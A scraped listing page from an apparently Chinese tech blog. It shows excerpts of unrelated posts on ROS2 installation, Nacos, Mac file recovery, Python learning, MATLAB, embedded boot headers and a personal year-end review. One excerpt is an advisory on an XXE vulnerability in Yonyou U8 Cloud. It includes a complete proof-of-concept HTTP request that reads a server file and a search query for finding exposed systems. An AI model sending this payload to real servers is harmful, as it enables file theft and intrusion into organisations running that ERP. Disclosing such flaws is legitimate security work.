程序的青少年素质教育培训系统ssm基于微信小程序的药店管理系统基于微信小程序的家校通平台基于微信小程序的校园跑腿系统基于微信小程序的校园达达互助平台基于微信小程序的灯具商城基于微信小程序的点餐系统基于微信小程序的点餐系统的设计与实现基于微信小程序的物流仓储系统基于微信小程序的电子产品基于微信小程序的电影院购票平台基于微信小程序的电脑维修预约系统基于微信小程序的社区心理健康服务基于微信小程序的社区物品租赁系统基于微信小程序的科普之家小程序基于微信小程序的竞赛管理系统基于微信小程序的答题系统基于微信小程序的线上教学辅助系统基于微信小程序的课程分享平台基于微信小程序的资助定制游基于微信小程序的食堂订餐系统基于微信小程序的食谱大全基于微信小程序的驾校教培小程序基于微信小程序社区疫情防控系统基于微信小程序的图书馆座位预约管理系统基于微信小程序的校园快递代领平台 四、部分案例展示 最后 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/928deb1f82c96e1a91c14bf0e16d3e16/" rel="bookmark">
			ros2 ubuntu 20.04 安装 foxy
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		设置区域设置 确保您有一个支持UTF-8. 如果您处于最小环境（例如 docker 容器）中，则区域设置可能是最小的，例如POSIX. 我们使用以下设置进行测试。但是，如果您使用不同的 UTF-8 支持的区域设置，应该没问题。
locale # check for UTF-8 sudo apt update &amp;&amp; sudo apt install locales sudo locale-gen en_US en_US.UTF-8 sudo update-locale LC_ALL=en_US.UTF-8 LANG=en_US.UTF-8 export LANG=en_US.UTF-8 locale # verify settings 设置源 您需要将 ROS 2 apt 存储库添加到您的系统中。
首先确保Ubuntu Universe 存储库已启用。
sudo apt install software-properties-common sudo add-apt-repository universe 现在使用 apt 添加 ROS 2 GPG 密钥。
sudo apt update &amp;&amp; sudo apt install curl -y sudo curl -sSL https://raw.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/928deb1f82c96e1a91c14bf0e16d3e16/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9fc230a4d6bc753033842f6d04d137c5/" rel="bookmark">
			本地服务启动后nacos注册ip错误导致网关请求错误以及网关无法将请求发送nacos内的本地服务错误原因
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		查看一下网关ip到nacos本地服务ip是否是通的本地服务ip地址是否是你想要的，如果不通请看下文
原因 如果电脑装了虚拟机，或者使用了VPN，所以存在多块网卡，服务注册到nacos时默认使用了虚拟机或者vpn对外的网卡，导致网关无法将请求路由到正确的服务上。
nacos查看服务的IP地址如下
实际想使用的IP地址是 127.0.0.1 ，即我本机的IP地址，因为开发环境服务是运行在本机的。
解决办法： 直接在spring配置文件中将相关服务nacos的配置里加上ip这一项属性，将注册的服务IP直接设置为想要的IP地址，然后重启服务即可。
spring: cloud: nacos: discovery: server-addr: localhost:8848 ip: 127.0.0.1 修改完成重启服务之后在nacos查看的地址如下：
------------------------------------------与正文内容无关------------------------------------
如果觉的文章写对各位读者老爷们有帮助的话，麻烦点赞加关注呗！小弟在这拜谢了!
如果您觉得我的文章在某些地方写的不尽人意或者写的不对，从而让你对你人生观产生颠覆（概不负责），需要斧正，麻烦在评论区不吝赐教，作者看到后会根据您的提示查阅文章进行修改，还这世间一个公理一片蓝天
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/956072493e436a61f46f4f169946a442/" rel="bookmark">
			如何恢复Mac误删文件？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法1. 使用撤消命令 当你在 Mac 上删除了错误的文件并立即注意到你的错误时，你可以使用撤消命令立即恢复它。顾名思义，此命令会反转上次完成的操作，并且有多种方法可以调用它。如果你已经采取了其他操作或退出了用于删除文件的应用程序，则此操作无效。
删除文件后，转到“编辑”并选择“撤消移动”选项。或者你也可以使用command+Z键撤销删除操作。
方法2. 检查废纸篓 当你不小心删除了Mac文件时，可以检查你的废纸篓。在大多数情况下，当你删除一个文件，它会被移动到废纸篓。这意味着如果你没有清空废纸篓，你很有可能恢复被删除的文件。
1. 单击桌面底部的“废纸篓”图标，浏览或使用搜索栏查找所需文件。
2.右键单击需要恢复的硬盘文件，然后单击“放回原处”选项以将其还原到其原始位置。
方法3. 从iCloud备份恢复Mac文件 如果你已将数据备份到 iCloud，这是你可以用来尝试将Mac磁盘恢复的另一种方式。iCloud是Apple的云服务，建议你在这里备份数据，以防出现此类情况。从 iCloud云盘取回文件很简单：
1. 在iCloud.com登录账号后单击“iCloud云盘”，然后找到并点击“最近删除”选项。
2. 导航到从中删除文件的文件夹并选择它们。现在单击“还原”将它们放回同一文件夹中。
无论你是删除iCloud、Mac还是iOS设备中的文件，此方法都适用。但是，如果它们已从 iCloud.com永久删除，你将无法取回它们。
方法4. 寻求专业帮助 如果你尝试了以上方法仍然无法将Mac磁盘恢复，或者你对电脑操作不熟悉，不想冒险尝试，那么可以寻求专业帮助。Mac电脑维修中心通常具备专业的数据恢复设备和技术人员，他们能够帮助你从硬盘中恢复删除文件。
结语 以上就是Mac磁盘恢复的详细方法了。误删文件是一种常见的错误操作，但幸运的是，在Mac系统中恢复这些文件并不是一件困难的事情。通过从废纸篓中恢复、使用时间机器备份或寻求专业帮助。无论哪种方法，我们都应该尽快采取行动，并确保在恢复文件之前停止对硬盘的写入操作，以避免覆盖原始文件。
如果您是Windows PC或Windows Server系统不小心误删了重要数据的话，则可以尝试像傲梅恢复之星这样的数据恢复工具来找回数据，不过话说回来，想要直接有效地避免数据误删或丢失，提前备份定期备份才是正解。
Mac磁盘恢复：轻松找回删除数据 (disktool.cn)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/842a76a23506d42fb58ee0c13f10c212/" rel="bookmark">
			为什么要学习Python呢？有了 ChatGPT 还有必要学习 python 吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么学习Python呢？ 学习 Python 的原因有很多，以下是一些常见的原因：
简单易学： Python 是一门易于学习的编程语言，语法简单、清晰明了，可以快速掌握基本的编程概念。应用广泛： Python 是一门通用的编程语言，可用于 Web 开发、数据分析、机器学习、人工智能、游戏开发等多个领域。巨大的社区和生态系统： Python 拥有庞大的社区和丰富的生态系统，包括众多的开源库和框架，可以快速实现各种功能和项目。高效的开发效率： Python 代码简洁、易读、易维护，开发效率高，可以快速迭代和实现新的功能。多种学习资源： Python 有大量的学习资源，包括教程、文档、社区和在线课程等，可以轻松入门和提升。 总之，Python 是一门功能强大、易于学习、应用广泛的编程语言，学习它可以帮助你快速掌握编程基础，拥有广泛的应用领域，提高工作效率，并且有丰富的资源和社区支持。
有了 ChatGPT 还有必要学习 python 吗？ 虽然 ChatGPT 可以回答许多问题，但是它仅仅是一个自然语言处理模型，不能取代 Python 编程语言。就比如你让它给你写个爬虫程序，起码你自己要懂吧，不然这代码到底对不对，哪里会有bug产生你都不知道，那不就是降维打击嘛。所以ChatGPT定义是工具，用来提升我们开发效率，工作效率的，当然它会取代一部分岗位，但绝不是编程语言，心理学倒是有可能；
Python同时还是一门 强大的通用编程语言，可以用于数据分析、机器学习、Web 开发、自动化脚本等多个领域。使用 Python 可以更加自由地处理数据和实现自定义的逻辑，同时还可以结合 ChatGPT 等自然语言处理模型，实现更多有趣的应用。因此，如果你想要从事与编程相关的工作，学习 Python 是非常有必要的。
那么零基础该如何学习Python？ 给大家一个忠告，如果你完全没有基础的话，前期最好不要盲目去找资料学习，因为大部分人把资料收集好之后，基本上都是放在收藏夹吃灰，同时资料收集的多了，学起来就会迷茫，也会让自己很有压力。
磨刀不误砍柴工，如果你是准备自学的话，要分步骤去进行：
第一步：搭建学习知识框架，具体怎么搭建学习框架，在后面我会讲；第二步：按照学习框架给自己定制阶段性的学习计划和目标，最好是按周自我反馈和调整；第三步：针对每周的学习计划寻找合适的学习资源，注意，只找当前需要的，不要贪多第四步：找几个懂得人，和他们处理好关系，后面学习过程中遇到问题还能有人给你解答； 这些都要一步一步来，不要想着一口气吃成一个大胖子。
搭建学习框架也是有诀窍的，比如我常用的三种方式：
和牛人成为朋友，身边的朋友或公司的同事都可以，但要注意，记得请人家吃饭联络好感情，不然到关键时刻，很少有人会去帮你；从各个博客网站上面搜索想了解的知识点路线图，然后找高赞的博文，基本上不会差，但要注意辨别真伪；多找几个培训机构，看他们整理的课程大纲是什么样的，涉及哪些知识点，然后做归类汇总，具体的我就不说了，免得让大家认为我在给培训机构打广告； 废话不多说，先上一张图镇楼，看看Python有哪些方向，它们之间有什么关系和区别，各自需要学习哪些东西。
怎么入门？ 我们落到具体的技术点上来，Python学习路线，整体学习正常时间大概半年左右，具体视每个人的情况而定。
如果你把每周要学的内容精细化到这种程度，你还会担心学不会，入不了门吗，其实说到底就是学了两个月，但都是东学一下，西学一下，什么内容都是浅尝辄止，没有深入进去，所以才会有学了2个月，入不了门这种感受。如果你想快速入门，可以看看下面一个月入门计划，详细到每一天要学什么？当然你也可以把每一周换成每个月。
第一周：熟悉 Python
要积极探索 Python 的使用方法，尽可能多的完成下面这些任务：
第一天：基本概念（4 小时）：print，变量，输入，条件语句第二天：基本概念（5 小时）：列表，for 循环，while 循环，函数，导入模块第三天：简单编程问题（5 小时）：交换两个变量值，将摄氏度转换为华氏温度，求数字中各位数之和，判断某数是否为素数，生成随机数，删除列表中的重复项等等第四天：中级编程问题（6 小时）：反转一个字符串（回文检测），计算最大公约数，合并两个有序数组，猜数字游戏，计算年龄等等第五天：数据结构（6 小时）：栈，队列，字典，元组，树，链表。第六天：面向对象编程（OOP）（6 小时）：对象，类，方法和构造函数，面向对象编程之继承第七天：算法（6 小时）：搜索（线性和二分查找）、排序（冒泡排序、选择排序）、递归函数（阶乘、斐波那契数列）、时间复杂度（线性、二次和常量） 别急着安装 Python 环境！
这看起来很矛盾，但是你一定要相信我。我有几个朋友，他们因为语言工具包和 IDE 安装的失败而逐渐失去了学习下去的欲望。因此，我的建议是先使用一些安卓 app 来探索这门语言，比如编程英雄（https://play.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/842a76a23506d42fb58ee0c13f10c212/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/057c5b0c20e631e48bc07498e03260e4/" rel="bookmark">
			UE4 4.21-4.27使用编辑器蓝图EditorBlueprint方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在UE4 4.21中，编辑器蓝图（Editor Blueprint）是一个强大的工具，允许开发者扩展和自定义Unreal编辑器的功能。通过编辑器蓝图，我们可以创建自定义的工具和功能，以优化开发流程。
本教程将指导您如何在UE4 4.21中使用编辑器蓝图。
步骤1：创建编辑器蓝图 1、在UE4编辑器中，打开“插件”（Plugins）菜单。
2、搜索并勾选“编辑器实用工具蓝图（Editor Utility Blueprint）”
3、在Editor Preference中，开启EditorUtility Blueprints 功能
3.在ContentBrowser中，右键，在蓝图的选项中找到blutility
创建完成后，右键单击此蓝图，点击 Edit Bluprint ，就可以进行编辑器蓝图编写。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/328aea4cdc0cb53f9f848200e1e4e9bb/" rel="bookmark">
			【MATLAB】CEEMDAN_LSTM神经网络时序预测算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有意向获取代码，请转文末观看代码获取方式~也可转原文链接获取~
1 基本定义 CEEMDAN-LSTM神经网络时序预测算法是一种结合了完全扩展经验模态分解（CEEMD）和自适应噪声（AN）以及长短期记忆神经网络（LSTM）的时间序列预测方法。
首先，CEEMDAN算法将原始时间序列分解为一系列固有模式函数（IMF）和一个残差序列。与CEEMD不同的是，CEEMDAN在分解过程中引入了自适应噪声，通过在每个IMF上添加不同的噪声来提高分解的准确性和稳定性。
然后，将利用CEEMDAN分解后的IMFs输入到LSTM中。LSTM是一种深度学习中的流行方法，尤其在处理长时间序列相关问题上具有独特优势。LSTM的内部结构由遗忘门、输入门、输出门和存储单元组成，通过这些门控单元的相互作用，LSTM能够学习到时间序列中的长期依赖关系。
通过结合CEEMDAN和LSTM，该算法能够更好地捕捉时间序列中的复杂模式，提高预测的准确性和稳定性。在实际应用中，CEEMDAN-LSTM算法可以应用于各种领域，如金融市场预测、气象预报、能源消耗预测等。
CEEMDAN-LSTM神经网络时序预测算法具有以下优点：
「高分解准确性」：通过引入自适应噪声，CEEMDAN能够更准确地提取时间序列中的复杂模式，从而提高预测的准确性。
「稳定性好」：自适应噪声的引入增加了算法的稳定性，使其在处理不同类型的时间序列数据时都能表现出良好的性能。
「可扩展性强」：CEEMDAN-LSTM算法可以与其他先进的机器学习算法相结合，进一步提高预测的准确性和稳定性。
「灵活性高」：该算法可以根据实际需求进行调整和优化，适用于不同领域的时间序列预测问题。
然而，CEEMDAN-LSTM神经网络时序预测算法也存在一些潜在的缺点：
「计算复杂度高」：由于该算法涉及多个步骤和复杂的计算过程，因此对于大规模时间序列数据的处理可能会面临计算性能的挑战。
「对异常值敏感」：由于自适应噪声的引入，该算法可能对异常值较为敏感，可能导致预测结果受到一定影响。
「对初值敏感」：LSTM模型的初值设定对预测结果具有一定影响，可能需要在训练过程中进行适当的调整和优化。
「需要大量数据」：LSTM模型通常需要大量的数据进行训练，对于小规模数据集可能无法达到理想的预测效果。
总体而言，CEEMDAN-LSTM神经网络时序预测算法在时间序列预测领域具有一定的优势和潜力，但也需要针对具体问题进行适当的调整和优化。
2 出图效果 附出图效果如下：
见附件~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4a54f5f4282079cbb47c63d3cd2c3d0/" rel="bookmark">
			Java|招商引资系统平台小程序主要功能开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着全球经济一体化的深入发展，招商引资在推动地方经济发展、促进产业升级转型、提高就业率等方面具有不可替代的作用。而一个高效、专业的招商引资平台，则能够更好地发挥这一作用，帮助地方政府和投资者实现共赢。
一、招商平台主要功能模块包括：
信息发布：发布招商引资和招才引智的各类信息，包括投资环境介绍、政策法规、招商项目等。
在线服务：提供线上咨询、洽谈、签约、项目管理、投资服务等，提升服务质量。
资源对接：搭建起企业和政府、人才和项目的对接桥梁，帮助双方实现精准匹配。
数据分析：通过数据分析工具，对投资环境、产业分布、人才需求等进行深入研究，为决策提供数据支持。
营销推广：通过平台进行企业宣传、项目推广、品牌营销等，提升企业和项目的知名度。
互动交流：提供在线论坛、社区等互动交流功能，促进企业间、人才间的交流与合作。
个性化定制：根据用户需求，提供个性化的定制服务，满足不同用户的差异化需求。
项目管理：对招商引资和招才引智项目进行全周期管理，包括项目策划、实施、监控和评估等环节。
人才库管理：建立人才库，收录各类人才信息，方便企业和人才进行匹配。
政策法规库：收录各类政策法规，方便用户查询和了解。
在线学习：提供在线学习功能，帮助用户提升自身素质和能力。
投资环境评估：对各地的投资环境进行评估，为用户提供参考依据。
这些功能模块可以根据实际需求进行组合，以满足不同用户的需求。
二、优势
招商引资平台通过汇聚各类资源，包括政策资源、人力资源、技术资源等，为投资者提供全面的投资信息和决策支持。
招商引资平台可以集中展示地方政府的优惠政策、奖励措施以及优质服务，从而吸引更多的投资者关注和入驻。
招商引资平台作为信息交流的中心，可以为各方提供及时、准确的市场信息和投资机会。
招商引资平台可以为投资者提供一站式的服务，包括项目对接等。
如需更进一步咨询了解源码或者定制，请咨询小编。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0d9aafc2f2fe2396f78d8eda168a5fb/" rel="bookmark">
			嵌入式Linux之MX6ULL裸机开发学习笔记（IMX启动方式-IVT表和BootData和DCD详解）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一,启动头文件 1.Boot Rom做的事情。 当我们设置BOOT模式为内部BOOT模式后，I.MX6U内部的boot ROM就会执行，首先初始化时钟，设置内核时钟为396MHz。使能MMU和Cache，使能L1Cache和L2Cache MMU，目的就是为了加速启动。
从BOOT_CFG设置的外置存储中，读取image，然后做相应的处理。
2.IVT和Boot Data数据 bin文件前面要添加头部。可以得到，我们烧写到SD卡中的load.imx文件在SD卡中的起始地址是0x400,也就是1024。
头部大小为3KB加上偏移的1KB，一共为4KB，因此在SD卡中Bin文件起始地址为4096。
IVT大小为32B/4=8条。
就是以下8条：
IVT+Boot Data的数据，很多都是左神从NXP官方u-boot.imx文件里面提取出来的。
3.DCD数据 Device configuration data ,DCD就是配置6ULL内部寄存器的。首先，将CCRG0-CCRG6全部写为0xffffffff,表示打开所有外设时钟，然后就是DDR初始化参数。设置DDR控制器，也就是初始化DDR。
4.其他的数据 检查数据命令，NOP命令，解锁命令。这些命令也都属于DCD。
总结：这一小节讲的是头部信息的分析，头部信息有哪些，我的理解就是头部数据一共占用了4KB，bin文件的偏移1K加上3K的TVI和boot data和DCD数据一共是4KB。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1eb164fa51168d21597a994e81be9462/" rel="bookmark">
			Nacos学习笔记-Windows下安装Nacos
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Nacos学习笔记 Windows下安装Nacos Nacos 快速开始
下载编译后的压缩包：Releases · alibaba/nacos (github.com) 解压 新建数据库nacos_config 导入nacos\conf\nacos-mysql.sql 在nacos\bin目录下打开终端，输入(standalone代表着单机模式运行，非集群模式)： startup.cmd -m standalone 服务注册 curl -X POST "http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=nacos.naming.serviceName&amp;ip=20.18.7.10&amp;port=8080" 服务发现 curl -X GET "http://127.0.0.1:8848/nacos/v1/ns/instance/list?serviceName=nacos.naming.serviceName" 发布配置 curl -X POST "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=HelloWorld" 获取配置 curl -X GET "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test" 双击nacos\bin\shutdown.cmd关闭Nacos 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62e62fc8fa491b9724cb6019e012b37e/" rel="bookmark">
			汽车零部件软件开发流水线思维导图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天跟大家分享下汽车零部件软件开发流水线的思维导图，希望对做零部件软件开发的小伙伴有些参考作用，欢迎大家订阅专栏，一起探讨汽车软件开发，共同进步。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f48c1cbf9b92277c2e1d70b262f139c4/" rel="bookmark">
			怎么用java写网页？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Java中，我们通常使用JavaServer Pages (JSP)技术来创建简单的网页。以下是一个简单的JSP页面的示例：
jsp复制代码
&lt;%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;我的简单网页&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;欢迎来到我的简单网页&lt;/h1&gt; &lt;p&gt;这是一个使用Java编写的简单网页。&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; 这个JSP页面非常简单，只有一个标题和一个段落。要运行这个JSP页面，你需要一个支持JSP的Web服务器，比如Apache Tomcat。
注意，虽然这个示例展示了如何使用Java创建简单的网页，但在现代Web开发中，通常使用JavaScript、HTML和CSS等前端技术，以及后端技术如Node.js、Python、Ruby等，而不是Java。Java通常用于后端开发，处理数据库交互、API开发等任务。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43ba0a431a8532bf2a21dd163806cbfd/" rel="bookmark">
			2175. 飞行员配对方案问题（最大流之二分图匹配）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2175. 飞行员配对方案问题 - AcWing题库
第二次世界大战时期，英国皇家空军从沦陷国征募了大量外籍飞行员。
由皇家空军派出的每一架飞机都需要配备在航行技能和语言上能互相配合的 2 名飞行员，其中 1 名是英国飞行员，另 1 名是外籍飞行员。
在众多的飞行员中，每一名外籍飞行员都可以与其他若干名英国飞行员很好地配合。
如何选择配对飞行的飞行员才能使一次派出最多的飞机。
对于给定的外籍飞行员与英国飞行员的配合情况，试设计一个算法找出最佳飞行员配对方案，使皇家空军一次能派出最多的飞机。
输入格式 第 1 行有 2 个正整数 m 和 n。m 是外籍飞行员数；n 是皇家空军的飞行员总数。
外籍飞行员编号为 1∼m；英国飞行员编号为 m+1∼n。
接下来每行有 2 个正整数 i 和 j，表示外籍飞行员 i 可以和英国飞行员 j 配合。
文件最后以 2 个 −1 结束。
输出格式 第 11 行是最佳飞行员配对方案一次能派出的最多的飞机数 M。
接下来 M 行是最佳飞行员配对方案。
每行有 2 个正整数 i 和 j，表示在最佳飞行员配对方案中，外籍飞行员 i 和英国飞行员 j 配对。
如果有多种配对方案，则输出任意一种即可，方案内部配对输出顺序随意。
数据范围 1&lt;m&lt;n&lt;100
输入样例： 5 10 1 7 1 8 2 6 2 9 2 10 3 7 3 8 4 7 4 8 5 10 -1 -1 输出样例： 4 1 7 2 9 3 8 5 10 解析： 仔细观察匈牙利算法不难发现，匈牙利算法实际上就是一种非常特别的 EK 算法，他每次循环之寻找一条增广路。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/43ba0a431a8532bf2a21dd163806cbfd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91453aeab9bfb532371560998174fa98/" rel="bookmark">
			2022 自杀式年度总结（已发老板）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2022年，其实过的有点遗憾，感觉自己做了很多，可是因为这疫情让我好像没有从中获取到太多的成就感，我有时候还是会像个小孩子一样，自己开发好的需求，会自己欣赏一遍，然后迫不及待让别人看看，听听别人的夸奖。或者假装凡尔赛一样跑到别人面前说一句：唉，又一不小心把活儿都干完了。没活儿了啊~ ~
其实自己也知道这样的心态跟以往的“自我驱动”想法相背，或许也是因为疫情吧，刚开始的我会更喜欢一堆同事在边上一起工作的氛围，长时间的居家办让我学会了如何一个人排除外界干扰进入到自己的“心流”状态投入到工作。也正是因为这样，让我更容易沉浸到自己的代码world。我非常享受一个人在公司写代码到傍晚的那一段时间，我可以感觉到我的思维异常活跃，平时可能要按着脑门儿想一会儿的逻辑，我可能就在逐步分解、梳理逻辑的过程中就把问题解决了。
有一段时间我基本每天都是晚上八点以后下班，并不是我效率低干不完，而是我习惯有思路的时候一次写完。当完成一个节点的时候，就会有莫大的成就感，然后给自己奖励去抽支烟。也就因为这样，我负责的需求大部分都是提前完成，然后在交付日期之前一段时间都是我主动找需求提出人打磨需求，讨论是否有更合理的或者实用的Featrue。
不过也是因为有时候加班太频繁，有同事会跟我说我太卷了。让我稍微放松点。公司这种节奏你要是这么卷你自己也会受不了的。
说实话，这是我工作几年来头一次因为加班太多被同事“嫌弃”，我也反思我这么做是不是真的有问题。一开始我觉得我加班只是我的工作习惯，与别人无关。我那时候也挺苦恼的，我跟我媳妇儿说过这个问题，我媳妇儿只是让我别管别人，我自己爱怎么样怎么样。于是我并没有把他的这句话放在心上，直到2022年10月份那一段时间。
从2022年10月份左右开始，那段时间公司管理层重心在忙着接入BOSS，并没有给我相关的任务。本来我需求做的就快，后面还有一段时间是预留给我用来优化需求的时间，一开始没觉得什么，反倒还觉得心理美滋滋，天天拿工资不用干活儿诶。可是我突然发现我好像没活儿了，一天到晚坐在电脑前没有需求要做，特别是听着别人的键盘敲得噼啪乱响，而我却打开掘金论坛刷着网页。我感觉我受不了了，我又不是退休的大爷，没有事儿干觉得上班好没劲。
我先后主动找过UI/产品/项目经理问有没有我能干的活儿，得到的结果都是——没有。
我感觉公司不需要我了，我每天来公司坐在电脑前除了看掘金就是找以前的项目做代码重构，
我开始着手把一些存量的Bug去尝试修复，虽然很无聊，但好歹算是有点活儿干了。
直到我把所有的存量Bug都修复完，完了，我又成多余的了。
看着边上的同事每天忙的跟狗一样，我却因为没事干就去抽烟抽到肺疼，我想走歪路了。自己碗里没饭了，就去抢别人的，我开始找阿正要Java的教程开始学习Java知识，学累了就趴桌上看后端同学做点什么，看看自己可能要学哪方面的知识。这样又过了一段时间，当我都开始跟后端同学讨论Java中throw 一个Error是否会打断try catch结构中finally区块执行的时候，我还是没有活儿。
那段时间我突然明白那位同事告诉我的那些的意思，虽然没有再去主动想过他说的话，但是我就是突然明白了。
这种整天不知道干嘛的日子让我很是无所适从，期间也再次尝试主动找过别人要活儿，还是一样的回答。
日子持续到SDP前端项目（一座多年迭代的💩山系统）到我手上，我瞬间有种寡妇失业的快乐，
但是当我看完SDP的代码的时候，我有了一种寡妇再就业的苍白无力。
是，SDP需求挺多的，也有的挺复杂的，但是再怎么样也不能掩盖这是往💩上盖别墅的操作。
我写的语句再工整，我也不敢格式化，因为我怕万一那个地方出问题了，diff下来我全责。
我写的逻辑再清晰，我也不敢直接覆盖，因为我真的看不懂原来代码里那一个个没有任何上下文关系的奇怪控制结构。
有时候真的有冲动自己重构一下这部分逻辑，我不觉得我是个严重“代码洁癖”的FE-coder，但我真没法理解会有人用汉语拼音加英文混合命名结果英文还能拼错的。当我看明白这个问题的时候，我气笑了。
说这么多，至少有活儿干了。还是照旧把活儿都干完了。空了几天，没活儿了。开始弄存量bug，存量Bug也清完了。边上的后端同学还是累成狗，还得是抢饭吃，还是找后端同学，不过这次是看Linux&amp;Docker。
……
直到我遇到了ta……我亲爱的综合网管项目，我仿佛二婚寡妇再失业的激动，有些需求真的很复杂！有些实现我好像没思路！但是！我也是真的写的停不下来！我好像感觉那种“心流”又回来了，也就是在写这篇逻辑混乱的年终总结的前几分钟，我刚给这个已经写完的需求又加了一个我觉得超级牛逼的Featrue。
总得来说，过去的一年我感觉的更多是我思维的一种改变，我学会了在各种环境下去找到最适合当下环境的心态，至少这对我很有用。我希望自己的努力被人看到，也更希望我自己的努力付出会有回报，对过去的这一年用一句话来给自己一个中肯的评价：包容不如意与拥抱变化。
对于已经到来的2023，我只能说期待，公司也从原来坐不满地下室一间小办公室的小团伙发展到现在一个作为外包公司却可以反手招人入职甲方公司的香饽饽。只能说我眼前看到很多活儿，也看得到一堆项目。我可以扛住巨大压力，只要能看得见希望，我就愿意去不懈努力。新的一年希望不要再当寡妇。
还有，我真的对Java没兴趣。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da393be650efa553c65479300d0b91ac/" rel="bookmark">
			用友U8 Cloud smartweb2.RPC.d XML外部实体注入漏洞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		产品介绍 用友U8cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型、集团型企业，提供企业级云ERP整体解决方案。它包含ERP的各项应用，包括iUAP、财务会计、iUFO cloud、供应链与质量管理、人力资源、生产制造、管理会计、资产管理，以及电商通、U会员、U订货、友云采、友报账、友空间、友人才等用友云服务。
漏洞描述 用友U8 Cloud smartweb2.RPC.d接口存在XML外部实体注入漏洞，由于用友GRP-U8未对用户的输入进行有效的过滤，攻击者可通过xml实体注入漏洞获取敏感信息，进一步利用可造成主机失陷。
资产测绘 app=“用友-U8-Cloud”
漏洞复现 POC如下：
POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1 Host: your_ip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Content-Length: 258 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Language: zh-CN,zh;q=0.9 Connection: close __viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&amp;__xml=&lt;!DOCTYPE z [&lt;!ENTITY Password SYSTEM "file:///C://windows//win.ini" &gt;]&gt;&lt;rpc transaction="10" method="resetPwd"&gt;&lt;vps&gt;&lt;p name="__profileKeys"&gt;%26Password;&lt;/p &gt;&lt;/vps&gt;&lt;/rpc&gt; 修复建议 联系厂商升级至最新安全版本。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/939e557bd2cddc8a237202b1ce5185fc/" rel="bookmark">
			AQS原来是这么设计的，泰裤辣!
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		缘起 每门编程语言基本都离不开并发问题，Java亦如此。谈到Java的并发就离不开Doug lea老爷子贡献的juc包，而AQS又是juc里面的佼佼者
因此今天就一起来聊聊AQS
概念 AQS是什么，这里借用官方的话
Provides a framework for implementing blocking locks and related synchronizers that rely on first-in-first-out wait queues
AQS的全程是AbstractQueuedSynchronizer，在这里咱们进行咬文嚼字一下。
Abstract：这是AQS采用模板设计模式的基础，AQS中将定义了大部分同步的流程，仅将加解锁的操作留给子类根据需求进行自定义（这也就是为什么使用AQS可以快速开发锁或者同步器的主要原因）
Queued：这里指的是CLH队列；当共享资源被占用时，就需要一套线程阻塞等待以及被唤醒时锁分配机制，AQS通过CLH队列来实现
